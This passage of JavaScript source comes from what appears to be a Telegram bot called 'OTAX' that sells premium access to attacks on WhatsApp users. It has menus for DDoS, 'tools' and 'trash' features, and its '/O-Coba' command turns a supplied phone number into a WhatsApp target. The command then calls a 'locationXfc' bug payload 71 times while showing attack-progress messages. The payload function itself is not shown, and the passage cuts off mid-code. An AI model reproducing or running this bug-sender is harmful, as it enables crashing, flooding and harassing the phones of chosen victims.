РЋГРћЂРћЂРћЂсђљ­ЮЋє­ЮЋІ­ЮћИ­ЮЋЈсђЉРћЂРћЂРћЂ
РћЃрЮ░.рљЪ ТЅђТюЅУђЁ  : @Otapengenkawin
РћЃрЮ░.рљЪ сЃљсЃ╝сѓИсЃДсЃ│ : 3.0 р┤ў╩ђр┤Ј ╔бр┤Є╔┤ 2
РћЃрЮ░.рљЪ сЃЕсЃ│сѓ┐сѓцсЃа : ${runtime}
РЋ░РћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД.
РІєЯ╝║­ЊєЕРЮЪРЮЏРЮЪ­ЊєфЯ╝╗РІє­Юўќ­ЮўЏ­Юўѕ­ЮўЪРІєЯ╝║­ЊєЕРЮЪРЮЏРЮЪ­ЊєфЯ╝╗РІєРІє
РЋГРћЂ( р┤ё╩ђр┤Єр┤ђр┤Џр┤Є р┤ўр┤ђ╔┤р┤Є╩Ъ )
РћЃрЮ░.рљЪ /1╔б╩Ў р┤юsр┤Є╩ђ, ╔фр┤Ё р┤Џр┤Є╩Ър┤Є
РћЃрЮ░.рљЪ /2╔б╩Ў р┤юsр┤Є╩ђ, ╔фр┤Ё р┤Џр┤Є╩Ър┤Є
РћЃрЮ░.рљЪ /3╔б╩Ў р┤юsр┤Є╩ђ, ╔фр┤Ё р┤Џр┤Є╩Ър┤Є
РћЃрЮ░.рљЪ /4╔б╩Ў р┤юsр┤Є╩ђ, ╔фр┤Ё р┤Џр┤Є╩Ър┤Є
РћЃрЮ░.рљЪ /5╔б╩Ў р┤юsр┤Є╩ђ, ╔фр┤Ё р┤Џр┤Є╩Ър┤Є
РћЃрЮ░.рљЪ /6╔б╩Ў р┤юsр┤Є╩ђ, ╔фр┤Ё р┤Џр┤Є╩Ър┤Є
РћЃрЮ░.рљЪ /7╔б╩Ў р┤юsр┤Є╩ђ, ╔фр┤Ё р┤Џр┤Є╩Ър┤Є
РћЃрЮ░.рљЪ /8╔б╩Ў р┤юsр┤Є╩ђ, ╔фр┤Ё р┤Џр┤Є╩Ър┤Є
РћЃрЮ░.рљЪ /9╔б╩Ў р┤юsр┤Є╩ђ,╔фр┤Ё р┤Џр┤Є╩Ър┤Є
РћЃрЮ░.рљЪ /10╔б╩Ў р┤юsр┤Є╩ђ,╔фр┤Ё р┤Џр┤Є╩Ър┤Є
РћЃрЮ░.рљЪ /11╔б╩Ў р┤юsр┤Є╩ђ,╔фр┤Ё р┤Џр┤Є╩Ър┤Є
РћЃрЮ░.рљЪ /р┤ю╔┤╩Ъ╔ф р┤юsр┤Є╩ђ,╔фр┤Ё р┤Џр┤Є╩Ъ╩Ър┤Є
РћЃрЮ░.рљЪ /р┤ё╩ђр┤Єр┤ђр┤Џр┤Єр┤ђр┤Ёр┤Ї╔ф╔┤ р┤юsр┤Є╩ђ,╔фр┤Ё р┤Џр┤Є╩Ър┤Є
РћЃрЮ░.рљЪ /р┤Ёр┤Є╩Ъsrv
РћЃрЮ░.рљЪ /╩Ъ╔фsр┤Џsrv
РћЃрЮ░.рљЪ /╔ф╔┤sр┤Џр┤ђ╩Ъ╩Ър┤ўр┤ђ╔┤р┤Є╩Ъ
РћЃрЮ░.рљЪ /р┤ю╔┤╔ф╔┤sр┤Џр┤ђ╩Ъ╩Ър┤ўр┤ђ╔┤р┤Є╩Ъ
РћЃрЮ░.рљЪ /╩юр┤ђр┤ёр┤І╩Ўр┤ђр┤ёр┤І
РЋ░РћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД.
РЋГРћЂ( Mр┤Є╔┤р┤ю Lр┤ђ╔ф╔┤ )
РћЃрЮ░.рљЪ /р┤Џр┤Џ <р┤ю╩ђ╩Ъ>
РћЃрЮ░.рљЪ /р┤Їр┤Єр┤Ё╔фр┤ђмЊ╔ф╩ђр┤Є <р┤ю╩ђ╩Ъ>
РћЃрЮ░.рљЪ /╔б╔фр┤Џ╩юр┤ю╩Ў <р┤ю╩ђ╩Ъ>
РћЃрЮ░.рљЪ /р┤ў╩Ър┤ђ╩Ј <р┤Џр┤Є╩ђsр┤Є╩ђр┤ђ╩ю ╩Ър┤ю>
РћЃрЮ░.рљЪ /р┤Џр┤Јр┤ю╩ђ╩Ъ
РЋ░РћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД. 
\`\`\``;
      replyMarkup = { inline_keyboard: [[{ text: "­ЮЎ║­ЮЎ┤­ЮЎ╝­ЮЎ▒­ЮЎ░­ЮЎ╗­ЮЎИ сЃё", callback_data: "back_to_main" }]] };
    }
    
     if (query.data === "tqto") {
      const pesan = `\`\`\`
      р┤Џ╩юр┤ђ╔┤р┤Іs мЊр┤Ј╩ђ р┤ђ╩Ъ╩Ъ ╩Ўр┤ю╩Ј╩Јр┤Є╩ђ sр┤ё╩ђ╔фр┤ўр┤Џ р┤ђ╔┤р┤Ё р┤Ї╩Ј р┤ўр┤ђ╩ђр┤Џ╔┤р┤Є╩ђs / р┤ўр┤ђ╩ђр┤Џ╔┤р┤Є╩ђ р┤ў╩ђ╔фр┤ар┤ђр┤Џр┤Є р┤ёр┤ђр┤юsр┤Є ╩Јр┤Јр┤ю р┤Јр┤Џр┤ђx р┤ёр┤ђ╔┤ sр┤Џр┤ђ╔┤р┤Ё р┤Џ╩ю╔фs мЊр┤ђ╩ђ р┤ђ╔┤р┤Ё ╩Ўр┤Є р┤ђs ╔б╩ђр┤Єр┤ђр┤Џ р┤ђs ╔фр┤Џ ╩Ў╩Ј р┤ђ╩Ър┤Ар┤ђ╩Јs р┤юs╔ф╔┤╔б р┤Јр┤Џр┤ђx р┤Єр┤ар┤Є╔┤ р┤Џ╩юр┤Јр┤ю╔б╩ю ╔фр┤Џ ╔фs ╔┤р┤Јр┤Џ р┤ђs ╔б╩ђр┤Єр┤ђр┤Џ р┤ђs р┤Џ╩юр┤Є р┤Јр┤Џ╩юр┤Є╩ђs Рюў
Я╝║­ЊєЕРЮЪРЮЏРЮЪ­ЊєфЯ╝╗РІє­Юўќ­ЮўЏ­Юўѕ­ЮўЪРІєЯ╝║­ЊєЕРЮЪРЮЏРЮЪ­ЊєфЯ╝╗РІє
РЋГРћЂ( ­ЮЋІ­ЮЋЎ­ЮЋњ­ЮЋЪ­ЮЋю­ЮЋц ­ЮЋІ­ЮЋа )
РћЃрЮ░.рљЪ р┤ђ╩Ъ╩Ър┤ђ╩ю [ р┤Ї╩Ј ╔бр┤Јр┤Ё ]
РћЃрЮ░.рљЪ ╩Ўр┤ю╔┤р┤Ёр┤ђ╩юр┤ђ╩ђр┤ђ 
РћЃрЮ░.рљЪ р┤Јр┤Џр┤ђ [ р┤Ёр┤Єр┤а┬╣ ]
РћЃрЮ░.рљЪ р┤ђ╩Јр┤ю╔┤ [ р┤Ёр┤Єр┤а┬▓ ]
РћЃрЮ░.рљЪ ╩Ър┤Јр┤Џр┤юs [ sр┤юр┤ўр┤ўр┤Ј╩ђр┤Џ ]
РћЃрЮ░.рљЪ р┤Ё╩ђр┤ђ╔бр┤Ј╔┤ [ sр┤юр┤ўр┤ўр┤Ј╩ђр┤Џ ]
РћЃрЮ░.рљЪ р┤Їр┤Єр┤бр┤бр┤ю [ р┤Џр┤ђ╔┤╔бр┤ђ╔┤ р┤Ір┤ђ╔┤р┤ђ╔┤ ]
РћЃрЮ░.рљЪ ╩ђ╩Јр┤ю╩ю╔фр┤Їр┤ю╩ђр┤ђ [ р┤Џр┤ђ╔┤╔бр┤ђ╔┤ р┤Ір┤ђ╔┤р┤ђ╔┤ ]
РћЃрЮ░.рљЪ р┤ір┤ђ╩Јр┤б [ р┤Џр┤ђ╔┤╔бр┤ђ╔┤ р┤Ір┤ђ╔┤р┤ђ╔┤ ]
РћЃрЮ░.рљЪ ╩Ўр┤ђ╩Ър┤б [ р┤Џр┤ђ╔┤╔бр┤ђ╔┤ р┤Ір┤ђ╔┤р┤ђ╔┤ ]
РћЃрЮ░.рљЪ sр┤І╩Јр┤бр┤Єр┤б [ р┤Џр┤ђ╔┤╔бр┤ђ╔┤ р┤Ір┤ђ╔┤р┤ђ╔┤ ]
РћЃрЮ░.рљЪ x╔┤р┤Є╩Ър┤ё╩ђр┤Јр┤А [ р┤Џр┤ђ╔┤╔бр┤ђ╔┤ р┤Ір┤ђ╔┤р┤ђ╔┤ ]
РћЃрЮ░.рљЪ ╩Ър┤Єx [ р┤Џр┤ђ╔┤╔бр┤ђ╔┤ р┤Ір┤ђ╔┤р┤ђ╔┤ ]
РћЃрЮ░.рљЪ sр┤ђ╩ђ╔фр┤ў -444 [ р┤ўр┤ђ╩ђр┤Џ╔┤р┤Є╩ђ ]
РћЃрЮ░.рљЪ р┤Ё╔фxр┤Є╩Ј [ р┤ўр┤ђ╩ђр┤Џ╔┤р┤Є╩ђ ]
РћЃрЮ░.рљЪ ╔ф'р┤Ї sр┤І╩Ј [ р┤ўр┤ђ╩ђр┤Џ╔┤р┤Є╩ђ ]
РћЃрЮ░.рљЪ р┤бр┤Є╔┤╔фр┤Џ╩ю [ р┤ўр┤ђ╩ђр┤Џ╔┤р┤Є╩ђ ]
РћЃрЮ░.рљЪ ╩Ър┤юxx╩Ј [ р┤ўр┤ђ╩ђр┤Џ╔┤р┤Є╩ђ ]
РћЃрЮ░.рљЪ р┤І╔фр┤Џр┤Єр┤Џ [ р┤ўр┤ђ╩ђр┤Џ╔┤р┤Є╩ђ ]
РћЃрЮ░.рљЪ р┤Ар┤ђр┤Їр┤б [ р┤ўр┤ђ╩ђр┤Џ╔┤р┤Є╩ђ ]
РћЃрЮ░.рљЪ sр┤ђр┤Џр┤ю╩ђ╔┤ [ р┤ўр┤ђ╩ђр┤Џ╔┤р┤Є╩ђ ]
РћЃрЮ░.рљЪ р┤Ї╔фр┤Ір┤ђр┤бр┤ю [ р┤ўр┤ђ╩ђр┤Џ╔┤р┤Є╩ђ ]
РћЃрЮ░.рљЪ р┤ђxр┤бр┤б [ р┤ўр┤ђ╩ђр┤Џ╔┤р┤Є╩ђ ]
РћЃрЮ░.рљЪ р┤ўр┤юр┤Џр┤ўр┤ђ╩Ј [ р┤ўр┤ђ╩ђр┤Џ╔┤р┤Є╩ђ ]
РћЃрЮ░.рљЪ ╩Јр┤ђ╔┤╔┤ [ р┤ўр┤ђ╩ђр┤Џ╔┤р┤Є╩ђ ]
РћЃрЮ░.рљЪ xр┤Є╔┤р┤Ј [ р┤ўр┤ђ╩ђр┤Џ╔┤р┤Є╩ђ ]
РћЃрЮ░.рљЪ мЊр┤ђ╔┤р┤Џ [ р┤ўр┤ђ╩ђр┤Џ╔┤р┤Є╩ђ ]
РћЃрЮ░.рљЪ р┤ўр┤ђр┤Џр┤б╩Ј [ р┤ўр┤ђ╩ђр┤Џ╔┤р┤Є╩ђ ]
РћЃрЮ░.рљЪ ╩Ър┤ђ╔┤╔бр┤б [ р┤ўр┤ђ╩ђр┤Џ╔┤р┤Є╩ђ ]
РћЃрЮ░.рљЪ ╔бр┤ђ╩Ър┤ђx╩Ј р┤Їр┤ђ╔┤р┤б╩Ј [ р┤ўр┤ђ╩ђр┤Џ╔┤р┤Є╩ђ ]
РћЃрЮ░.рљЪ ╔┤р┤Јр┤Є╩Ър┤б [ р┤ўр┤ђ╩ђр┤Џ╔┤р┤Є╩ђ ]
РћЃрЮ░.рљЪ р┤ёр┤ђр┤ёр┤ђ [ р┤ўр┤ђ╩ђр┤Џ╔┤р┤Є╩ђ ]
РћЃрЮ░.рљЪ р┤Ёр┤Ј╩Ър┤б [ р┤ўр┤ђ╩ђр┤Џ╔┤р┤Є╩ђ ]
РћЃрЮ░.рљЪ ╩Јsр┤ёр┤Є╩Ъ╩Ъ [ р┤ўр┤ђ╩ђр┤Џ╔┤р┤Є╩ђ ]
РћЃрЮ░.рљЪ sр┤І╩Јр┤бр┤Ј [ р┤ўр┤ђ╩ђр┤Џ╔┤р┤Є╩ђ ]
РћЃрЮ░.рљЪ р┤а╔ф╔┤р┤бx [ р┤ўр┤ђ╩ђр┤Џ╔┤р┤Є╩ђ ]
РћЃрЮ░.рљЪ s╩юр┤Јр┤ю [ р┤ўр┤ђ╩ђр┤Џ╔┤р┤Є╩ђ ]
РћЃрЮ░.рљЪ р┤бр┤бр┤ђ╔┤ ╩Ўр┤Є╩Ър┤ђ╔┤р┤Ёр┤ђ [ р┤ўр┤ђ╩ђр┤Џ╔┤р┤Є╩ђ ]
РћЃрЮ░.рљЪ ╩Ъ╔фр┤Їр┤ар┤бx [ р┤ўр┤ђ╩ђр┤Џ╔┤р┤Є╩ђ ]
РћЃрЮ░.рљЪ xр┤Џ╩ђр┤ђ [ р┤ўр┤ђ╩ђр┤Џ╔┤р┤Є╩ђ ]
РћЃрЮ░.рљЪ мЊр┤ђ╔┤р┤бр┤б [ р┤ўр┤ђ╩ђр┤Џ╔┤р┤Є╩ђ ]
РћЃрЮ░.рљЪ р┤Є╔фр┤Їр┤ђ╔┤ [ р┤ўр┤ђ╩ђр┤Џ╔┤р┤Є╩ђ ]
РћЃрЮ░.рљЪ р┤бр┤юр┤Є [ р┤ўр┤ђ╩ђр┤Џ╔┤р┤Є╩ђ ]
РћЃрЮ░.рљЪ р┤бр┤юр┤ўр┤ўр┤Є╩ђ [ р┤ўр┤ђ╩ђр┤Џ╔┤р┤Є╩ђ ]
РћЃрЮ░.рљЪ sр┤Єр┤Їр┤юр┤ђ р┤ўр┤Єр┤Ї╩Ўр┤Є╩Ъ╔ф sр┤ё╩ђ╔фр┤ўр┤Џ
РЋ░РћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД.
\`\`\``;
bot.sendMessage(chatId, pesan, { parse_mode: "Markdown" });
      replyMarkup = { inline_keyboard: [[{ text: "­ЮЎ║­ЮЎ┤­ЮЎ╝­ЮЎ▒­ЮЎ░­ЮЎ╗­ЮЎИ сЃё", callback_data: "back_to_main" }]] };
    }
        if (query.data === "back_to_main") {
      caption = `\`\`\`
РЋГРћЂРћЂРћЂсђљ­ЮЋє­ЮЋІ­ЮћИ­ЮЋЈсђЉРћЂРћЂРћЂ
РћЃрЮ░.рљЪ ТЅђТюЅУђЁ  : @Otapengenkawin
РћЃрЮ░.рљЪ сЃљсЃ╝сѓИсЃДсЃ│ : 3.0 р┤ў╩ђр┤Ј ╔бр┤Є╔┤ 2
РћЃрЮ░.рљЪ сЃЕсЃ│сѓ┐сѓцсЃа : ${runtime}
РЋ░РІєРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД.
Я╝║­ЊєЕРЮЪРЮЏРЮЪ­ЊєфЯ╝╗РІє­Юўќ­ЮўЏ­Юўѕ­ЮўЪРІєЯ╝║­ЊєЕРЮЪРЮЏРЮЪ­ЊєфЯ╝╗РІє
РЋГРћЂ( ­ЮЋђ­ЮЋЪ­ЮЋЌ­ЮЋа­ЮЋБ­ЮЋъ­ЮЋњ­ЮЋц­ЮЋџ )
РћЃрЮ░.рљЪ сЃдсЃ╝сѓХсЃ╝ : ${username}
РћЃрЮ░.рљЪ сЃдсЃ╝сѓХсЃ╝ID : ${senderId}
РћЃрЮ░.рљЪ сЃЌсЃгсЃЪсѓбсЃасѓ╣сЃєсЃ╝сѓ┐сѓ╣ : ${premiumStatus}
РЋ░РћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД.
РЋГРћЂ( sр┤Ј╩Ър┤юs╔ф ╩Ъ╔фр┤Ї╔фр┤Џ )
РћЃрЮ░.рљЪ /otax <pesan lu>
РћЃр┤Їр┤Є╔┤╔б╔ф╩ђ╔фр┤Ї р┤ўр┤Єsр┤ђ╔┤ р┤Ір┤Є р┤Ёр┤Єр┤ар┤Є╩Ър┤Јр┤ўр┤Є╩ђ ╩Ўр┤Јр┤Џ x р┤Јр┤Џр┤ђ
РћЃрЮ░.рљЪ /owner <pesan lu>
РћЃр┤Їр┤Є╔┤╔б╔ф╩ђ╔фр┤Ї р┤ўр┤Єsр┤ђ╔┤ р┤Ір┤Є р┤Јр┤А╔┤р┤Є╩ђ ╩Ўр┤Јр┤Џ
РЋ░РћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД.
лАл┐л░ЛЂлИл▒лЙ, ЛЄЛѓлЙ лИЛЂл┐лЙл╗ЛїлиЛЃлхЛѓлх "OTAX" л║л░л║ ЛЂл▓лЙЛј ЛЂлИл╗ЛЃ, л║лЙл│л┤л░ л▓ЛІ л┐лЙл┤л░л▓л╗лхлйЛІ лИ ЛЃЛЂЛѓл░л╗лИ, ЛЈ "OTA" ЛЁлЙЛЄЛЃ ЛЂл║л░лил░ЛѓЛї л▒лЙл╗ЛїЛѕлЙлх ЛЂл┐л░ЛЂлИл▒лЙ Лѓлхл╝ лИли л▓л░ЛЂ, л║ЛѓлЙ л▓ЛЂлхл│л┤л░ л┐лЙл┤л┤лхЛђлХлИл▓л░лхЛѓ л╝лхлйЛЈ.л» лил┤лхЛЂЛї, л┐лЙл║л░ лйлх ЛЂл╝лЙл│ЛЃ л▒ЛІЛѓЛї л┐лЙ-л┤ЛђЛЃл│лЙл╝ЛЃ

\`\`\``;
replyMarkup = { inline_keyboard: [[{ text: "­ЮЎ║­ЮЎ┤­ЮЎ╝­ЮЎ▒­ЮЎ░­ЮЎ╗­ЮЎИ сЃё", callback_data: "back_to_main" }]] };
      replyMarkup = {
        inline_keyboard: [
        [{ text: "­ЮЎ┐­ЮЎ┤­ЮЎй­ЮЎХ­ЮЎ░­ЮџЃ­Юџё­ЮџЂ­ЮЎ░­ЮЎй Рюў", callback_data: "setting" }, { text: "­ЮЎЙ­Юџє­ЮЎй­ЮЎ┤­ЮџЂ Рюў", callback_data: "owner_menu" }, { text: "­ЮџЃ­Юџђ­ЮџЃ­ЮЎЙ Рюў", callback_data: "tqto" }],
        [{ text: "­ЮЎ│­ЮЎ│­ЮЎЙ­Юџѓ Рюў", callback_data: "ddos" }, { text: "­ЮџЃ­ЮЎЙ­ЮЎЙ­ЮЎ╗­Юџѓ Рюў", callback_data: "tools" }],
        [{ text: "­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў", callback_data: "trashmenu" }]
      ]
      };
    }

    await bot.editMessageMedia(
      {
        type: "photo",
        media: "https://files.catbox.moe/4v8phs.png",
        caption: caption,
        parse_mode: "Markdown"
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup
      }
    );

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
})

//=======CASE BUG=========//

bot.onText(/\/O-Coba (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const target = Jid;
  const mention = Jid;
  const isTarget = Jid;
   
const delay = ms => new Promise(res => setTimeout(res, ms));
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`­ЮЎђ­ЮЎЕ­ЮЎЎ­ЮЎќ­ЮЎЮ\`\`\`
­ЮЎђ­ЮЎб­ЮЎќ­ЮЎБ­ЮЎю­ЮЎБ­ЮЎ«­ЮЎќ ­ЮЎЄ­ЮЎф ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќЯЦѓЯцЙЯЦђЯЦѓ ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "­Юўќ­ЮўИ­Юў»­Юўд­Юў│", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "­ЮЎѓ­ЮЎќ­ЮЎЎ­ЮЎќ ­ЮЎј­ЮЎџ­ЮЎБ­ЮЎЎ­ЮЎџ­ЮЎД ­Юўй­ЮЎќ­ЮЎБ­ЮЎюсЃё ­ЮЎе­ЮЎъ­ЮЎА­ЮЎќ­ЮЎЮ­ЮЎа­ЮЎќ­ЮЎБ /­ЮЎД­ЮЎџ­ЮЎд­ЮЎЦ­ЮЎќ­ЮЎъ­ЮЎД ­ЮЎЕ­ЮЎџ­ЮЎД­ЮЎА­ЮЎџ­ЮЎЌ­ЮЎъ­ЮЎЮ ­ЮЎЎ­ЮЎќ­ЮЎЮ­ЮЎф­ЮЎА­ЮЎфРюў"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

   
const sent = await bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ уіХТЁІ : ­Юўџ­Юўб­ЮўБ­Юўб­Юў│ ­Юўћ­Юўб­Юў┤­Юўф­ЮўЕ ­ЮўЌ­Юў│­Юў░­Юў┤­Юџј­Юџю ­Юўа­Юўб­ЮўгРюў....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\``,
    parse_mode: "Markdown"
});
    const frames = [
    'Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 10%',
    'Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 20%',
    'Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 30%',
    'Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 40%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 50%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒ 60%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒ 70%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒ 80%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒ 90%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░ 100%'
  ];

  const texts = [
    '­ЪДе л▒ЛЃл┤ЛїЛѓлх л│лЙЛѓлЙл▓ЛІ',
    '­ЪЉ╗ л╝ЛЃЛЂЛЃЛЁл╝ЛЃ ЛѓлхЛђл╗лИЛЁл░Лѓ',
    '­Ъћњ л░л║ЛЃ л┤лИЛЂлИлйлИ ЛЃлйЛѓл░л║л╝ЛЃ',
    'РџЊ л░л┐л░л║л░ЛЁ л║л░л╝ЛЃ ЛЂЛЃл┤л░ЛЁ ЛЂлИл░л┐',
    '­Ъцг л┐лхлйЛїлхЛђл░лйл│л░лй л┤лИл╝ЛЃл╗л░л╣',
    '­ЪДа лйлх л╝лЙлХлхЛѓ л▒ЛІЛѓЛї',
    '­ЪњБ OTAX ЛЂлИл░л┐ л╝лхлйЛїлхЛђл░лйл│',
    '­Ъїђ OTAX лаЛЈл┤лЙл╝ ЛЂ ЛѓлЙл▒лЙл╣',
    '­ЪњЦ л║л░л║ ЛѓЛІ л╝лЙл╣ л▓Лђл░л│',
    'РюЁ люЛЃЛЂлйл░ЛЁл╗л░ЛЁ л┐лхл╝л▒лхлйл┤лХлИл║ЛЃ'
];

  for (let i = 0; i < frames.length; i++) {
    const loadingText = `
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
${frames[i]}
РЎЏ ${texts[i]}
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\`
    `;
    await bot.editMessageCaption(loadingText, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    await delay(400);
  }
    await bot.editMessageCaption(`
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ сЃЌсЃГсѓ╗сѓ╣   : ­ЮўЌ­Юў│­Юў░­Юў┤­Юўд­Юў┤ ­ЮўЌ­Юўд­Юў»­Юўе­Юўф­Юў│­Юўф­Юў«­Юўб­Юў» ­ЮўЅ­ЮўХ­Юўе Рюў
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    
    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
     console.log(chalk.blue(`\n
РћЂРћЂРћЂсђљ­ЮЋє­ЮЋІ­ЮћИ­ЮЋЈсђЉРћЂРћЂРћЂ
 Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ уіХТЁІ : ­Юўџ­Юўб­ЮўБ­Юўб­Юў│ ­Юўћ­Юўб­Юў┤­Юўф­ЮўЕ ­ЮўЌ­Юў│­Юў░­Юў┤­Юўд­Юў┤ ­Юўа­Юўб­ЮўгРюў....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
РІєРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД`));
  for (let i = 0; i <= 70; i++) {
      await locationXfc(isTarget);
      await sleep(1000);
      }
console.log(chalk.blue(`\n
РћЂРћЂРћЂсђљ­ЮЋє­ЮЋІ­ЮћИ­ЮЋЈсђЉРћЂРћЂРћЂ
 Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ уіХТЁІ : ­Юўџ­ЮўХ­ЮўЦ­Юўб­ЮўЕ ­ЮўЅ­Юўд­Юў│­ЮўЕ­Юўб­Юў┤­Юўф­ЮўГ ­ЮўЅ­Юў░­Юў┤­Юўг­ЮўХЯЦѓЯцЙЯЦђЯЦѓ....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
РІєРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД`));
    
   

  await bot.sendMessage(chatId, `
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ сѓ┐сѓцсЃасѓ┐сЃ│ : ${new Date().toLocaleString()}
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown",
      reply_markup: {
